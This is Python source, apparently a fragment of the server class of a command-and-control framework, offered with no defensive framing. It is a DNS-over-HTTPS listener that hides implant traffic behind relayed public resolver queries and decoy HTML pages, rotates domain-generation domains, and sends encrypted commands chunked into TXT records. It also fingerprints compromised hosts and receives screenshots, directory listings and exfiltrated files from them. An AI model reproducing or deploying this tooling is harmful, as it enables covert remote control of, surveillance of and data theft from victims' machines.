    def _add_custom_headers_to_app(self):
        @self.app.after_request
        def add_custom_headers(response):
            if request.method in ("GET", "HEAD"):
                for name, value in self.get_server_headers.items():
                    if name not in response.headers:
                        response.headers[name] = value
            if request.method == "POST":
                for name, value in self.post_server_headers.items():
                    if name not in response.headers:
                        response.headers[name] = value
            return response   
    def is_base64(self,s):
        if not isinstance(s, str):
            return False
        s = s.strip()
        try:
            self.b64decode(s, validate=True)
            return True
        except:
            try:
                self.b64decode(s)
                return True
            except:
                return False
    def build_a_rdata(self, ip):
        return struct.pack("!I", struct.unpack("!I", socket.inet_aton(ip))[0])
    def build_rr_a(self, rdata):
        return struct.pack("!H", 0xC00C) + struct.pack("!HHIH", 1, 1, 300, len(rdata)) + rdata
    def build_txt_rdata(self, text):
        b = text.encode()[:255]
        return bytes([len(b)]) + b
    def build_rr(self, rdata):
        return struct.pack("!H", 0xC00C) + struct.pack("!HHIH", 16, 1, 300, len(rdata)) + rdata
    def build_dns_response(self, qdata, answers):
        tid = struct.unpack("!H", qdata[:2])[0]
        qdcount = struct.unpack("!H", qdata[4:6])[0]
        header = struct.pack("!HHHHHH", tid, 0x8180, qdcount, len(answers), 0, 0)
        return header + qdata[12:] + b"".join(answers)
    def decode_name(self, reader):
        parts = []
        visited = set()
        while True:
            try:
                length = reader.read(1)[0]
            except:
                break
            if length == 0:
                break
            if length & 0xC0:
                ptr_bytes = reader.read(1)
                ptr = struct.unpack("!H", bytes([length & 0x3F]) + ptr_bytes)[0]
                if ptr in visited:
                    raise ValueError("DNS compression loop detected")
                visited.add(ptr)
                pos = reader.tell()
                reader.seek(ptr)
                parts.append(self.decode_name(reader))
                reader.seek(pos)
                break
            else:
                label = reader.read(length)
                if not label:
                    break
                parts.append(label)
        return b".".join(parts)
    def parse_dns_query(self, data):
        reader = io.BytesIO(data)
        reader.read(12) 
        questions = []
        while reader.tell() < len(data):
            try:
                name = self.decode_name(reader).decode('ascii', errors='ignore')
                qtype, qclass = struct.unpack("!HH", reader.read(4))
                questions.append((name, qtype, qclass))
            except:
                break
        return questions
    def generate_strong_dga_domain(self, implant_seed=None):
        now = int(time.time())
        period = int(now // self.dga_timer)
        if not implant_seed:
            raw = f"{uuid.uuid4()}{os.urandom(32).hex()}{time.time_ns()}"
            implant_seed = hashlib.sha3_256(raw.encode()).hexdigest()
        seed_int = int(implant_seed[:16], 16)
        seed_material = struct.pack("<QQ", period, seed_int)
        h = hashlib.sha3_512(seed_material).digest()
        h = hashlib.sha3_512(h + seed_material[::-1]).digest()
        final = hashlib.sha3_512(h).digest()
        subdomain = base64.b32encode(final[:13]).decode().rstrip('=').lower()
        suffix = self.all_suffixes[period % len(self.all_suffixes)]
        return f"{subdomain}.{suffix}", implant_seed
    def get_current_dga_domain(self, session_id):
        sess = self.sessions[session_id]
        now = time.time()
        period = int(now // self.dga_timer)
        if sess.get("dga_period") != period or "current_domain" not in sess:
            domain, seed = self.generate_strong_dga_domain(sess.get("dga_seed"))
            sess["current_domain"] = domain
            sess["dga_seed"] = seed
            sess["dga_period"] = period
        return sess["current_domain"]
    def split_command_safe(self, command, max_payload=190):
        if not command:
            return []
        try:
            encrypted_cmd = self.cipher.encrypt(command)
            encrypted_bytes = encrypted_cmd.encode('utf-8')       
            full_hash = hashlib.sha256(encrypted_bytes).hexdigest()[:8]
            encoded = self.b64encode(encrypted_bytes).decode('ascii')
            prefix_template = "cb:{part}/{total}:{checksum}:"
            example_prefix = prefix_template.format(part=999, total=999, checksum="12345678")
            prefix_overhead = len(example_prefix)
            chunk_size = max_payload - prefix_overhead
            if chunk_size < 20:
                chunk_size = 20
            chunks = []
            for i in range(0, len(encoded), chunk_size):
                chunks.append(encoded[i:i + chunk_size])
            total = len(chunks)
            final_parts = []
            for part_num, chunk in enumerate(chunks, 1):
                prefix = prefix_template.format(part=part_num, total=total, checksum=full_hash)
                record_text = f"{prefix}{chunk}"
                final_parts.append(record_text)
            return final_parts
        except Exception as e:
            self.update_output_text(f"[!] Encryption/split error: {e}\n", is_general=True)
            return []
    def split_config_safe(self, config_text, max_payload=190, prefix="cfg:"):
        if not config_text:
            return []
        try:
            encrypted_config = self.cipher.encrypt(config_text)
            encrypted_bytes = encrypted_config.encode('utf-8')
            full_hash = hashlib.sha256(encrypted_bytes).hexdigest()[:8]
            encoded = self.b64encode(encrypted_bytes).decode('ascii')
            prefix_template = f"{prefix}{{part}}/{{total}}:{full_hash}:"
            example_prefix = prefix_template.format(part=999, total=999)
            prefix_overhead = len(example_prefix)
            chunk_size = max_payload - prefix_overhead
            if chunk_size < 20:
                chunk_size = 20
            chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
            total = len(chunks)
            final_parts = []
            for part_num, chunk in enumerate(chunks, 1):
                prefix = prefix_template.format(part=part_num, total=total)
                record_text = f"{prefix}{chunk}"
                final_parts.append(record_text)
            return final_parts
        except Exception as e:
            self.update_output_text(f"[!] Config encryption/split error: {e}\n", is_general=True)
            return []
    def clean_output(self, raw_output):
        if not raw_output or not isinstance(raw_output, str):
            return raw_output
        lines = raw_output.splitlines()
        if self.prepend_output:
            prepend_lines = self.prepend_output.splitlines()
            while lines and prepend_lines and lines[0].strip() == prepend_lines[0].strip():
                lines.pop(0)
                prepend_lines.pop(0)
        if self.append_output:
            append_lines = self.append_output.splitlines()
            while lines and append_lines and lines[-1].strip() == append_lines[-1].strip():
                lines.pop()
                append_lines.pop()
        while lines and not lines[0].strip():
            lines.pop(0)
        while lines and not lines[-1].strip():
            lines.pop()
        return '\n'.join(lines).strip()
    def _unified_handler(self):
        is_doh_query = (
            request.args.get("dns") is not None or
            request.mimetype == "application/dns-message" or
            (request.data and len(request.data) > 10 and len(request.data) < 1024 and not request.is_json)
        )
        if is_doh_query and request.method in ["GET", "POST"]:
            try:
                if request.method == "GET":
                    b64 = request.args.get("dns")
                    if not b64:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    padding = "==" if len(b64) % 4 == 2 else "=" if len(b64) % 4 == 3 else ""
                    data = self.b64decode(b64 + padding)
                else:
                    data = request.get_data()
                questions = self.parse_dns_query(data)
                txt_q = next((q for q in questions if q[1] == 16), None)
                token = txt_q[0].split('.')[0] if txt_q and '.' in txt_q[0] else None
                if token != self.listener_uuid:
                    if not self.public_doh_servers:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    server = random.choice(self.public_doh_servers)
                    headers = {
                        "Content-Type": "application/dns-message",
                        "Accept": "application/dns-message",
                    }
                    if self.user_agents:
                        headers["User-Agent"] = random.choice(self.user_agents)
                    try:
                        r = requests.post(f"https://{server}/dns-query", data=data,
                                        headers=headers, timeout=10, verify=True)
                        return r.content, 200, {"Content-Type": "application/dns-message"}
                    except Exception:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                sid = request.args.get("session_id") or request.headers.get("X-Session-ID")
                if not sid or sid not in self.sessions:
                    if not self.listener_is_active:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    if self.session_limiting_enable and self.total_accepted_sessions >= self.max_sessions_limit:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    id_protocol = str(uuid.uuid4())
                    sid = f"DOH - AES - {id_protocol}"
                    domain, seed = self.generate_strong_dga_domain()
                    with self.lock:
                        self.sessions[sid] = {
                            "command": "uname",
                            "last_seen": time.time(),
                            "os_detected": False,
                            "os_type": None,
                            "os_img": None,
                            "info_collected": False,
                            "session_data_sent": False,
                            "dga_seed": seed,
                            "current_domain": domain,
                            "dga_period": int(time.time() // self.dga_timer),
                            "pending_command_parts": [],
                            "sent_parts_count": 0,
                            "command_checksum": "",            
                            "command_total_parts": 0,
                            "initial_command_sent": False,
                        }
                        self.execution_status[sid] = False
                    self.add_session(sid, None, (self.host, self.port), "aes_doH_server",exfiltration_profile=self.exfiltration_profile, encryption_type=self.cipher,encoding_type=None, quic_sessions=None)
                    if self.session_limiting_enable:
                        self.total_accepted_sessions += 1
                    self.current_active_sessions += 1
                    self.update_output_text(f"+-------------------------------------------------------------------------------------------------------------+\n[+] DoH connection from {request.remote_addr}, Beacon ID: {id_protocol}\n+-------------------------------------------------------------------------------------------------------------+\n\n",is_general=True)
                with self.lock:
                    sess = self.sessions[sid]
                    sess["last_seen"] = time.time()
                answers = []
                MAX_TXT_PER_BATCH = 12
                if any(q[1] == 1 for q in questions):
                    has_commands = False
                    if sess.get("pending_command_parts"):
                        sent = sess.get("sent_parts_count", 0)
                        total = sess.get("command_total_parts", 0)
                        if sent < total:
                            has_commands = True
                    if has_commands:
                        ip = self.pivot_a_record
                    else:
                        ip = self.shadow_a_record
                    answers.append(self.build_rr_a(self.build_a_rdata(ip)))
                if not sess.get("session_data_sent"):
                    init_payload_no_enc = (
                        f"i={sid}|"               
                        f"j={self.start_jitter}-{self.end_jitter}|"
                        f"t={int(self.dga_timer / 60)}|"
                        f"r={self.reconnect_delay_entry}|"     
                        f"d={self.reconnect_timeout_entry}|"
                        f"s={self.shadow_a_record}|"
                        f"p={self.pivot_a_record}|"
                        f"sl={self.Sleep}|"
                    )
                    init_payload = "ENC:" + self.cipher.encrypt(init_payload_no_enc)
                    answers.append(self.build_rr(self.build_txt_rdata(init_payload)))
                    uas_str = ",".join(self.user_agents) if self.user_agents else ""
                    uris_str = ",".join(self.uris) if self.uris else ""
                    get_headers_str = ";".join(f"{k}:{v}" for k, v in self.get_client_headers.items() if v)
                    post_headers_str = ";".join(f"{k}:{v}" for k, v in self.post_client_headers.items() if v)
                    str_payload = (
                        f"uas={uas_str}|"
                        f"uris={uris_str}|"
                        f"pre={self.prepend_output}|"
                        f"app={self.append_output}|"
                        f"geth={get_headers_str}|"
                        f"posth={post_headers_str}"
                    )
                    parts = self.split_config_safe(str_payload, prefix="cfg:")
                    for p in parts:
                        answers.append(self.build_rr(self.build_txt_rdata(p)))
                    answers.append(self.build_rr(self.build_txt_rdata(f"dga={self.get_current_dga_domain(sid)}")))
                    sess["session_data_sent"] = True
                if not sess.get("initial_command_sent") and sess.get("command"):
                    initial_cmd = sess["command"]
                    parts = self.split_command_safe(initial_cmd)
                    checksum = ""
                    if parts and parts[0].startswith("cb:"):
                        try:
                            prefix = parts[0][3:].split(":", 2)
                            if len(prefix) >= 2 and "/" in prefix[0]:
                                checksum = prefix[1]
                        except:
                            pass                    
                    sess["pending_command_parts"] = parts
                    sess["sent_parts_count"] = 0
                    sess["command_checksum"] = checksum
                    sess["command_total_parts"] = len(parts)
                    sess["initial_command_sent"] = True
                    with self.lock:
                        self.execution_status[sid] = True
                if sess.get("pending_command_parts") and sess["sent_parts_count"] < sess["command_total_parts"]:
                    remaining = sess["pending_command_parts"][sess["sent_parts_count"]:]
                    to_send_now = remaining[:MAX_TXT_PER_BATCH]
                    for part in to_send_now:
                        if len(part.encode('utf-8')) > self.max_txt_size:
                            continue
                        answers.append(self.build_rr(self.build_txt_rdata(part)))
                    sent_this_time = len(to_send_now)
                    sess["sent_parts_count"] += sent_this_time
                    if sess["command_checksum"]:
                        cmd_info = f"cmd_info:{sess['sent_parts_count']}/{sess['command_total_parts']}:{sess['command_checksum']}"
                        answers.append(self.build_rr(self.build_txt_rdata(cmd_info)))
                    if sess["sent_parts_count"] >= sess["command_total_parts"]:
                        completion_msg = f"cmd_complete:{sess['command_checksum']}"
                        answers.append(self.build_rr(self.build_txt_rdata(completion_msg)))
                        sess["pending_command_parts"] = []
                        sess["sent_parts_count"] = 0
                        sess["command_checksum"] = ""
                        sess["command_total_parts"] = 0
                        sess["command"] = ""
                        with self.lock:
                            self.execution_status[sid] = False
                answers.append(self.build_rr(self.build_txt_rdata(self.get_current_dga_domain(sid))))
                if self.spoofed_txt_records:
                    answers.append(self.build_rr(self.build_txt_rdata(random.choice(self.spoofed_txt_records))))
                dns_content = self.build_dns_response(data, answers)
                return dns_content, 200, {"Content-Type": "application/dns-message"}
            except Exception as e:
                self.update_output_text(f"[!] DoH query error: {str(e)}\n", is_general=True)
                return self.html_content, 200, {"Content-Type": "text/html"}
        if request.method == "POST" and request.is_json:
            try:
                data = request.get_json(silent=True)
                if not data:
                    return self.html_content, 200, {"Content-Type": "text/html"}
                session_id = data.get("session_id")
                if not session_id or session_id not in self.sessions:
                    return self.html_content, 200, {"Content-Type": "text/html"}
                with self.lock:
                    sess = self.sessions[session_id]
                    sess["last_seen"] = time.time()
                action = data.get("action")
                if action == "submit" or not action:
                    raw_output = data.get("output", "").strip()
                    output_encrypted = self.clean_output(raw_output)
                    with self.lock:
                        self.execution_status[session_id] = False
                    if output_encrypted:
                        try:
                            output = self.cipher.decrypt(output_encrypted)
                        except Exception as e:
                            self.update_output_text(f"[!] Decryption error: {e}\n", is_general=True)
                            output = "[Decryption Failed]"
                    else:
                        output = ""
                    if output.startswith("screenshot-"):
                        base64_data = output[11:]  
                        if self.save_screenshot_window:
                            self.save_screenshot_window(base64_data, session_id)
                        sess["command"] = ""
                        return jsonify({"status": "received"})
                    if output.startswith("browse-data-"):
                        base64_data = output[12:]
                        json_str = base64.b64decode(base64_data).decode('utf-8')
                        dir_data = json.loads(json_str)
                        if dir_data.get("success"):
                            self.open_file_browse_window(dir_data, session_id, sess.get("os_type"))
                        else:
                            self.update_output_text(f"[-] Error: {dir_data.get('error')}\n\n", is_general=False, session_name=session_id)
                        sess["command"] = ""
                        return jsonify({"status": "received"})
                    if output.startswith("file-data:"):
                        parts = output[10:].split('|', 2)
                        if len(parts) == 3:
                            filename, filesize_str, filedata_b64 = parts
                            self.save_file_from_browse(session_id, filename, filedata_b64)
                        sess["command"] = ""
                        return jsonify({"status": "received"})
                    if output.startswith("SUCCESS:") or output.startswith("ERROR:"):
                        if "Deleted" in output or "Renamed" in output:
                            if session_id in self.browse_windows:
                                browse = self.browse_windows.get(session_id)
                                if browse and browse.window_file_browse:
                                    browse.fetch_directory(browse.current_path)
                        sess["command"] = ""
                        return jsonify({"status": "received"})
                    if not sess.get("info_collected"):
                        if not sess.get("os_detected"):
                            if "Linux" in output:
                                sess["os_type"] = "Linux"
                                sess["os_img"] = self.images["Linux"]
                            else:
                                sess["os_type"] = "Windows"
                                sess["os_img"] = self.images["Windows"]
                            sess["os_detected"] = True
                            if sess["os_type"] == "Windows":
                                cmd = "hostname & powershell -Command $PID & cmd /c echo %os% & cmd /c echo %PROCESSOR_ARCHITECTURE% & for /f \"tokens=2 delims=:\" %i in ('ipconfig ^| findstr IPv4') do @echo %i"
                            else:
                                cmd = "hostname && echo $$ && uname -o && uname -m && hostname -I | awk \"{print \\$1}\""
                            parts = self.split_command_safe(cmd)
                            checksum = ""
                            if parts and parts[0].startswith("cb:"):
                                try:
                                    prefix = parts[0][3:].split(":", 2)
                                    if len(prefix) >= 2 and "/" in prefix[0]:
                                        checksum = prefix[1]
                                except:
                                    pass
                            sess["pending_command_parts"] = parts
                            sess["sent_parts_count"] = 0
                            sess["command_checksum"] = checksum
                            sess["command_total_parts"] = len(parts)
                            sess["command"] = ""                            
                            return jsonify({"status": "received"})
                        lines = [line.strip() for line in output.splitlines() if line.strip()]
                        try:
                            hostname = lines[0].strip()
                            pid = lines[1].strip()
                            os_ver = lines[2].strip()
                            arch = lines[3].strip()
                            public_ip = lines[4].strip()
                            architecture = f"{os_ver} - {arch}"
                        except:
                            hostname = pid = os_ver = arch = public_ip = architecture = "Unknown"
                        check_in_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        address = (request.remote_addr, request.environ.get('REMOTE_PORT', 'unknown'))
                        self.session_table.insert("", "end",
                            text=f" {sess['os_type']} - {arch}",
                            image=sess["os_img"],
                            values=(session_id, f"{address[0]}:{address[1]}", "00:00:00",
                                    hostname, check_in_time, pid, public_ip))
                        threading.Thread(target=self.track_doh_session_time,
                                    args=(session_id, address, pid, public_ip)).start()
                        if session_id not in self.running_server_instances:
                            self.running_server_instances[session_id] = {}
                        self.running_server_instances[session_id]["original_ips"] = (f"{address[0]}:{address[1]}", public_ip)
                        sess["info_collected"] = True
                        sess["command"] = ""
                        return jsonify({"status": "received"})
                    if output:
                        self.update_output_text(f"{output}\n\n", is_general=False, session_name=session_id)
                    sess["command"] = ""
                    return jsonify({"status": "received"})
                elif action == "set_command":
                    raw_cmd = data.get("command")
                    if not raw_cmd:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    parts = self.split_command_safe(raw_cmd.strip())
                    if not parts:
                        return self.html_content, 200, {"Content-Type": "text/html"}
                    checksum = ""
                    if parts and parts[0].startswith("cb:"):
                        try:
                            prefix = parts[0][3:].split(":", 2)
                            if len(prefix) >= 2 and "/" in prefix[0]:
                                checksum = prefix[1]
                        except:
                            pass
                    sess["pending_command_parts"] = parts
                    sess["sent_parts_count"] = 0
                    sess["command_checksum"] = checksum
                    sess["command_total_parts"] = len(parts)
                    sess["command"] = raw_cmd.strip()
                    with self.lock:
                        self.execution_status[session_id] = True
                    return jsonify({
                        "status": "command_queued",
                        "total_parts": len(parts),
                        "checksum": checksum
                    })
                return self.html_content, 200, {"Content-Type": "text/html"}
            except Exception as e:
                self.update_output_text(f"[!] JSON handler error: {str(e)}\n", is_general=True)
                return self.html_content, 200, {"Content-Type": "text/html"}
        return self.html_content, 200, {"Content-Type": "text/html"}
    def _register_routes(self):
        for uri in self.uris:
            if not uri.startswith('/'):
                uri = '/' + uri
            self.app.route(uri, methods=["GET", "POST"])(self._unified_handler)
    def track_doh_session_time(self, session_id, address, pid, ark):
        session_item = None
        try:
            for child in self.session_table.get_children():
                if self.session_table.item(child)['values'][0] == session_id:
                    session_item = child
                    break
        except:
            return
        if not session_item:
            return
        ip, port = address
        last_active_time = time.time()
        active_seconds = 0
        paused = False
        blink_counter = 0
        saved_time = "00:00:00"
        is_disconnected = False
        final_time = "00:00:00"
        while session_id in self.sessions:
            time.sleep(1)
            try:
                if not self.session_table.exists(session_item):
                    break
            except:
                break
            current_time = time.time()
            with self.lock:
                last_seen = self.sessions.get(session_id, {}).get("last_seen", last_active_time)
            since_last_seen = current_time - last_seen
            since_last_seen_minutes = since_last_seen / 60.0
            current_ip = f"{ip} : {port}"
            if self.hidden_addresses.get(session_id, False):
                current_ip = f"██████ : {port}"
            current_target = ark
            if self.hidden_addresses.get(session_id, False):
                current_target = "██████"
            is_executing = self.execution_status.get(session_id, False)
            is_reconnecting = since_last_seen > self.reconnect_delay_entry
            if not self.doh_aes_listener_instance or since_last_seen_minutes > self.reconnect_timeout_entry:
                if not is_disconnected:
                    is_disconnected = True
                    final_time = saved_time  
                    status = f"Disconnected - {final_time}"
                    self.update_output_text(f"[-] Client {address} disconnected.\n\n", is_general=True)
                if session_id in self.sessions:
                    with self.lock:
                        del self.sessions[session_id]
                        self.execution_status[session_id] = False
                if self.session_limiting_enable:
                    self.current_active_sessions = max(0, self.current_active_sessions - 1)
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, values=(
                            session_id, current_ip, status,
                            self.session_table.item(session_item)['values'][3],
                            self.session_table.item(session_item)['values'][4], pid, current_target
                        ), tags=("Disconnected",))
                except:
                    pass
                break
            if not is_reconnecting:
                active_seconds += 1
                saved_time = str(datetime.timedelta(seconds=active_seconds))
                paused = False
            if is_executing:
                blink_counter += 1
                if blink_counter % 2 == 0:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#D4A017", foreground="#FFFFFF")
                    except:
                        pass
                else:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#1e2220", foreground="#FFFFFF")
                    except:
                        pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Executing",))
                except:
                    pass
            elif is_reconnecting:
                status = f"Reconnecting - {saved_time}"
                try:
                    self.session_table.tag_configure("Reconnecting", background="#020B3F", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Reconnecting",))
                except:
                    pass
                paused = True
            else:
                status = f"Active - {saved_time}"
                try:
                    self.session_table.tag_configure("Active", background="#1e2220", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Active",))
                except:
                    pass
            try:
                if self.session_table.exists(session_item):
                    values = self.session_table.item(session_item)['values']
                    self.session_table.item(session_item, values=(
                        session_id, current_ip, status, values[3], values[4], pid, current_target
                    ))
            except Exception as e:
                self.update_output_text(f"Error updating DoH beacon time: {e}", is_general=False, session_name=session_id)
                break
    def close_session_by_id(self, session_uuid):
        found = False
        for sid in list(self.sessions.keys()):
            if session_uuid in sid:
                with self.lock:
                    self.sessions[sid]["last_seen"] = 0
                    self.sessions[sid]["command"] = ""
                    self.execution_status[sid] = False
                    if self.session_limiting_enable:
                        self.current_active_sessions = max(0, self.current_active_sessions - 1)
                found = True
        return found
    def start_server(self):
        def run():
            self.doh_aes_listener_instance = make_server(
                self.host, self.port, self.app,
                ssl_context = self.ssl_context,
                request_handler=lambda *args, **kwargs: CustomWSGIRequestHandler(*args, server_header=self.get_server_headers, **kwargs)
            )
            self.update_output_text(f"[i] Listening for DoH connections with AES encryption on {self.host}:{self.port}\n\n", is_general=True)
            self.update_output_text(f"[*] AUTH ID: {self.listener_uuid}\n\n", is_general=True)
            self.doh_aes_listener_instance.serve_forever()
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        if self.auth_timeout_enabled:
            self.start_auth_timeout(minutes=self.auth_timeout_minutes)
    def stop_server(self):
        for path in [self.cert_path, self.key_path]:
            if "Logs - Cert" in str(path) and os.path.exists(path):
                try:
                    os.remove(path)
                except:
                    pass
        if self.doh_aes_listener_instance:
            self.doh_aes_listener_instance.shutdown()
            self.doh_aes_listener_instance = None
        if self.thread:
            self.thread.join(timeout=3)
            self.thread = None
        with self.lock:
            self.execution_status.clear()
